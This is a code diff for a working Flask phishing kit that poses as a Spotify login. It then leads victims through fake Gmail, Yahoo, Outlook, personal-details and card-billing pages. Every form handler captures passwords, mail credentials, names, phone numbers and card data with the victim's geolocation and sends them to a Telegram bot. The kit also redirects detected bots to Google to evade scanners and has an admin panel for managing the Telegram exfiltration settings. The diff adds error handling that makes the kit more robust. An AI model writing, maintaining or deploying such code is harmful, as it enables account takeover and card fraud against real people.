@@ -47,6 +47,7 @@ visitors_log = deque(maxlen=200)
 captures_log = deque(maxlen=100)
 bot_log = deque(maxlen=50)
 activity_log = deque(maxlen=100)
+error_log = deque(maxlen=50)
 
 # ====== STATS ======
 STATS = {
@@ -514,91 +515,132 @@ def log_capture(data):
     captures_log.append(entry)
     STATS['total_captures'] += 1
 
+def log_error(error_type, error_message, ip=None):
+    entry = {
+        'timestamp': datetime.now().isoformat(),
+        'type': error_type,
+        'message': error_message,
+        'ip': ip or request.remote_addr
+    }
+    error_log.append(entry)
+
 # ====== ROUTES ======
 
 @app.route('/')
 def index():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    
-    is_bot_flag = is_bot()
-    log_visitor('/', is_bot_flag)
-    
-    if is_bot_flag:
-        return redirect('https://www.google.com')
-    
-    lang = detect_language_by_ip()
-    return render_template('index.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        
+        is_bot_flag = is_bot()
+        log_visitor('/', is_bot_flag)
+        
+        if is_bot_flag:
+            return redirect('https://www.google.com')
+        
+        lang = detect_language_by_ip()
+        return render_template('index.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('IndexError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/mail-gmail')
 def mail_gmail():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/mail-gmail')
-    lang = detect_language_by_ip()
-    return render_template('mail-gmail.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/mail-gmail')
+        lang = detect_language_by_ip()
+        return render_template('mail-gmail.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('GmailPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/mail-yahoo')
 def mail_yahoo():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/mail-yahoo')
-    lang = detect_language_by_ip()
-    return render_template('mail-yahoo.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/mail-yahoo')
+        lang = detect_language_by_ip()
+        return render_template('mail-yahoo.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('YahooPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/mail-outlook')
 def mail_outlook():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/mail-outlook')
-    lang = detect_language_by_ip()
-    return render_template('mail-outlook.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/mail-outlook')
+        lang = detect_language_by_ip()
+        return render_template('mail-outlook.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('OutlookPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/mail-generic')
 def mail_generic():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/mail-generic')
-    lang = detect_language_by_ip()
-    return render_template('mail-generic.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/mail-generic')
+        lang = detect_language_by_ip()
+        return render_template('mail-generic.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('GenericMailPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/personal')
 def personal():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/personal')
-    lang = detect_language_by_ip()
-    return render_template('personal.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/personal')
+        lang = detect_language_by_ip()
+        return render_template('personal.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('PersonalPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/billing')
 def billing():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/billing')
-    lang = detect_language_by_ip()
-    return render_template('billing.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/billing')
+        lang = detect_language_by_ip()
+        return render_template('billing.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('BillingPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/success')
 def success():
-    if CONFIG['mode'] == 'sleep':
-        return render_template('sleep.html')
-    if is_bot():
-        return redirect('https://www.google.com')
-    log_visitor('/success')
-    lang = detect_language_by_ip()
-    return render_template('success.html', lang=lang, get_text=get_text)
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return render_template('sleep.html')
+        if is_bot():
+            return redirect('https://www.google.com')
+        log_visitor('/success')
+        lang = detect_language_by_ip()
+        return render_template('success.html', lang=lang, get_text=get_text)
+    except Exception as e:
+        log_error('SuccessPageError', str(e))
+        return "Service temporarily unavailable", 500
 
 @app.route('/blocked')
 def blocked():
@@ -616,201 +658,239 @@ def sleep_page():
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    if CONFIG['mode'] == 'sleep':
-        return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
-    
-    if is_bot():
-        return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
-    
-    data = request.get_json()
-    email = data.get('email', '')
-    password = data.get('password', '')
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    geo = get_geo_data()
-    
-    capture_data = {
-        'type': 'Spotify Login',
-        'email': email,
-        'password': password,
-        'ip': geo['ip'],
-        'country': geo['country'],
-        'city': geo['city'],
-        'user_agent': user_agent
-    }
-    log_capture(capture_data)
-    
-    # ENVOI TELEGRAM
-    telegram.send_capture(capture_data)
-    
-    domain = email.split('@')[1].lower() if '@' in email else ''
-    
-    if 'gmail.com' in domain:
-        next_page = '/mail-gmail'
-    elif 'yahoo.com' in domain or 'ymail.com' in domain:
-        next_page = '/mail-yahoo'
-    elif 'outlook.com' in domain or 'hotmail.com' in domain:
-        next_page = '/mail-outlook'
-    elif '@' in email:
-        next_page = '/mail-generic'
-    else:
-        next_page = '/personal'
-    
-    return jsonify({'status': 'success', 'next': next_page})
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
+        
+        if is_bot():
+            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
+        
+        data = request.get_json()
+        email = data.get('email', '')
+        password = data.get('password', '')
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        geo = get_geo_data()
+        
+        capture_data = {
+            'type': 'Spotify Login',
+            'email': email,
+            'password': password,
+            'ip': geo['ip'],
+            'country': geo['country'],
+            'city': geo['city'],
+            'user_agent': user_agent
+        }
+        log_capture(capture_data)
+        
+        # ENVOI TELEGRAM
+        telegram.send_capture(capture_data)
+        
+        domain = email.split('@')[1].lower() if '@' in email else ''
+        
+        if 'gmail.com' in domain:
+            next_page = '/mail-gmail'
+        elif 'yahoo.com' in domain or 'ymail.com' in domain:
+            next_page = '/mail-yahoo'
+        elif 'outlook.com' in domain or 'hotmail.com' in domain:
+            next_page = '/mail-outlook'
+        elif '@' in email:
+            next_page = '/mail-generic'
+        else:
+            next_page = '/personal'
+        
+        return jsonify({'status': 'success', 'next': next_page})
+    except Exception as e:
+        log_error('LoginAPIError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/mail', methods=['POST'])
 def api_mail():
-    if CONFIG['mode'] == 'sleep':
-        return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
-    
-    if is_bot():
-        return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
-    
-    data = request.get_json()
-    provider = data.get('provider', 'Generic')
-    mail_email = data.get('mailEmail', '')
-    mail_password = data.get('mailPassword', '')
-    geo = get_geo_data()
-    
-    capture_data = {
-        'type': f'Mail Access ({provider})',
-        'email': mail_email,
-        'password': mail_password,
-        'ip': geo['ip'],
-        'country': geo['country'],
-        'city': geo['city'],
-        'user_agent': request.headers.get('User-Agent', 'Unknown')
-    }
-    log_capture(capture_data)
-    
-    # ENVOI TELEGRAM
-    telegram.send_capture(capture_data)
-    
-    return jsonify({'status': 'success', 'next': '/personal'})
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
+        
+        if is_bot():
+            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
+        
+        data = request.get_json()
+        provider = data.get('provider', 'Generic')
+        mail_email = data.get('mailEmail', '')
+        mail_password = data.get('mailPassword', '')
+        geo = get_geo_data()
+        
+        capture_data = {
+            'type': f'Mail Access ({provider})',
+            'email': mail_email,
+            'password': mail_password,
+            'ip': geo['ip'],
+            'country': geo['country'],
+            'city': geo['city'],
+            'user_agent': request.headers.get('User-Agent', 'Unknown')
+        }
+        log_capture(capture_data)
+        
+        # ENVOI TELEGRAM
+        telegram.send_capture(capture_data)
+        
+        return jsonify({'status': 'success', 'next': '/personal'})
+    except Exception as e:
+        log_error('MailAPIError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/personal', methods=['POST'])
 def api_personal():
-    if CONFIG['mode'] == 'sleep':
-        return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
-    
-    if is_bot():
-        return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
-    
-    data = request.get_json()
-    geo = get_geo_data()
-    
-    first_name = data.get('firstName', '')
-    last_name = data.get('lastName', '')
-    address = data.get('address', '')
-    city = data.get('city', '')
-    postal_code = data.get('postalCode', '')
-    phone = data.get('phone', '')
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    capture_data = {
-        'type': 'Personal Info',
-        'email': f'{first_name} {last_name}',
-        'password': phone,
-        'ip': geo['ip'],
-        'country': geo['country'],
-        'city': geo['city'],
-        'user_agent': user_agent
-    }
-    log_capture(capture_data)
-    
-    # ENVOI TELEGRAM
-    telegram.send_capture(capture_data)
-    
-    return jsonify({'status': 'success', 'next': '/billing'})
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
+        
+        if is_bot():
+            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
+        
+        data = request.get_json()
+        geo = get_geo_data()
+        
+        first_name = data.get('firstName', '')
+        last_name = data.get('lastName', '')
+        address = data.get('address', '')
+        city = data.get('city', '')
+        postal_code = data.get('postalCode', '')
+        phone = data.get('phone', '')
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        capture_data = {
+            'type': 'Personal Info',
+            'email': f'{first_name} {last_name}',
+            'password': phone,
+            'ip': geo['ip'],
+            'country': geo['country'],
+            'city': geo['city'],
+            'user_agent': user_agent
+        }
+        log_capture(capture_data)
+        
+        # ENVOI TELEGRAM
+        telegram.send_capture(capture_data)
+        
+        return jsonify({'status': 'success', 'next': '/billing'})
+    except Exception as e:
+        log_error('PersonalAPIError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/billing', methods=['POST'])
 def api_billing():
-    if CONFIG['mode'] == 'sleep':
-        return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
-    
-    if is_bot():
-        return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
-    
-    data = request.get_json()
-    geo = get_geo_data()
-    
-    card_holder = data.get('cardHolder', '')
-    card_number = data.get('cardNumber', '')
-    expiry = data.get('expiry', '')
-    cvv = data.get('cvv', '')
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    capture_data = {
-        'type': 'Billing/Card',
-        'email': card_holder,
-        'password': card_number[-4:],
-        'ip': geo['ip'],
-        'country': geo['country'],
-        'city': geo['city'],
-        'user_agent': user_agent
-    }
-    log_capture(capture_data)
-    
-    # ENVOI TELEGRAM
-    telegram.send_capture(capture_data)
-    
-    return jsonify({'status': 'success', 'next': '/success'})
+    try:
+        if CONFIG['mode'] == 'sleep':
+            return jsonify({'status': 'error', 'message': 'Service unavailable'}), 503
+        
+        if is_bot():
+            return jsonify({'status': 'error', 'message': 'Bot detected'}), 403
+        
+        data = request.get_json()
+        geo = get_geo_data()
+        
+        card_holder = data.get('cardHolder', '')
+        card_number = data.get('cardNumber', '')
+        expiry = data.get('expiry', '')
+        cvv = data.get('cvv', '')
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        capture_data = {
+            'type': 'Billing/Card',
+            'email': card_holder,
+            'password': card_number[-4:],
+            'ip': geo['ip'],
+            'country': geo['country'],
+            'city': geo['city'],
+            'user_agent': user_agent
+        }
+        log_capture(capture_data)
+        
+        # ENVOI TELEGRAM
+        telegram.send_capture(capture_data)
+        
+        return jsonify({'status': 'success', 'next': '/success'})
+    except Exception as e:
+        log_error('BillingAPIError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/admin', methods=['GET', 'POST'])
 def api_admin():
-    if request.method == 'POST':
-        data = request.get_json()
-        if data.get('passcode') == CONFIG['admin_passcode']:
-            if 'telegram_token' in data:
-                CONFIG['telegram_token'] = data['telegram_token']
-            if 'chat_id' in data:
-                CONFIG['chat_id'] = data['chat_id']
-            if 'mode' in data:
-                CONFIG['mode'] = data['mode']
-                activity_log.append({
-                    'time': datetime.now().isoformat(),
-                    'type': 'mode_change',
-                    'message': f'Mode changed to {data["mode"]}'
+    try:
+        if request.method == 'POST':
+            data = request.get_json()
+            if data.get('passcode') == CONFIG['admin_passcode']:
+                if 'telegram_token' in data:
+                    CONFIG['telegram_token'] = data['telegram_token']
+                if 'chat_id' in data:
+                    CONFIG['chat_id'] = data['chat_id']
+                if 'mode' in data:
+                    CONFIG['mode'] = data['mode']
+                    activity_log.append({
+                        'time': datetime.now().isoformat(),
+                        'type': 'mode_change',
+                        'message': f'Mode changed to {data["mode"]}'
+                    })
+                CONFIG['last_updated'] = datetime.now().isoformat()
+                
+                save_config(CONFIG)
+                
+                # RECONFIGURER TELEGRAM
+                telegram.configure(CONFIG['telegram_token'], CONFIG['chat_id'])
+                
+                return jsonify({
+                    'status': 'success',
+                    'config': CONFIG,
+                    'telegram_status': telegram.status,
+                    'telegram_last_response': telegram.last_error
                 })
-            CONFIG['last_updated'] = datetime.now().isoformat()
-            
-            save_config(CONFIG)
-            
-            # RECONFIGURER TELEGRAM
-            telegram.configure(CONFIG['telegram_token'], CONFIG['chat_id'])
-            
+            return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
+        
+        # GET
+        passcode = request.headers.get('X-Admin-Passcode')
+        if passcode == CONFIG['admin_passcode']:
             return jsonify({
                 'status': 'success',
                 'config': CONFIG,
-                'telegram_status': telegram.status,
-                'telegram_last_response': telegram.last_error
+                'stats': {
+                    'total_visitors': STATS['total_visitors'],
+                    'total_bots': STATS['total_bots'],
+                    'total_captures': STATS['total_captures'],
+                    'unique_ips': len(STATS['unique_ips']),
+                    'uptime': datetime.now().isoformat()
+                },
+                'logs': {
+                    'visitors': list(visitors_log)[:30],
+                    'captures': list(captures_log)[:20],
+                    'activity': list(activity_log)[:20],
+                    'errors': list(error_log)[:30]
+                },
+                'telegram': {
+                    'status': telegram.status,
+                    'configured': bool(CONFIG['telegram_token'] and CONFIG['chat_id']),
+                    'last_error': telegram.last_error
+                }
             })
-        return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
-    
-    # GET
-    passcode = request.headers.get('X-Admin-Passcode')
-    if passcode == CONFIG['admin_passcode']:
-        return jsonify({
-            'status': 'success',
-            'config': CONFIG,
-            'stats': {
-                'total_visitors': STATS['total_visitors'],
-                'total_bots': STATS['total_bots'],
-                'total_captures': STATS['total_captures'],
-                'unique_ips': len(STATS['unique_ips']),
-                'uptime': datetime.now().isoformat()
-            },
-            'logs': {
-                'visitors': list(visitors_log)[:30],
-                'captures': list(captures_log)[:20],
-                'activity': list(activity_log)[:20]
-            },
-            'telegram': {
-                'status': telegram.status,
-                'configured': bool(CONFIG['telegram_token'] and CONFIG['chat_id']),
-                'last_error': telegram.last_error
-            }
+        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
+    except Exception as e:
+        log_error('AdminAPIError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/admin/clear-errors', methods=['POST'])
+def clear_errors():
+    try:
+        data = request.get_json()
+        if data.get('passcode') != CONFIG['admin_passcode']:
+            return jsonify({'status': 'error', 'message': 'Invalid passcode'}), 401
+        
+        error_log.clear()
+        activity_log.append({
+            'time': datetime.now().isoformat(),
+            'type': 'error_clear',
+            'message': 'Error log cleared by admin'
         })
-    return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
+        return jsonify({'status': 'success', 'message': 'Error log cleared'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/static/<path:path>')
 def serve_static(path):
@@ -818,14 +898,18 @@ def serve_static(path):
 
 @app.route('/test-telegram')
 def test_telegram():
-    result = telegram.send_message("🧪 *Test message from server*\n\nIf you receive this, Telegram is working!")
-    return jsonify({
-        'status': 'success' if result else 'error',
-        'telegram_status': telegram.status,
-        'token_configured': bool(CONFIG['telegram_token']),
-        'chat_id_configured': bool(CONFIG['chat_id']),
-        'last_error': telegram.last_error
-    })
+    try:
+        result = telegram.send_message("🧪 *Test message from server*\n\nIf you receive this, Telegram is working!")
+        return jsonify({
+            'status': 'success' if result else 'error',
+            'telegram_status': telegram.status,
+            'token_configured': bool(CONFIG['telegram_token']),
+            'chat_id_configured': bool(CONFIG['chat_id']),
+            'last_error': telegram.last_error
+        })
+    except Exception as e:
+        log_error('TelegramTestError', str(e))
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
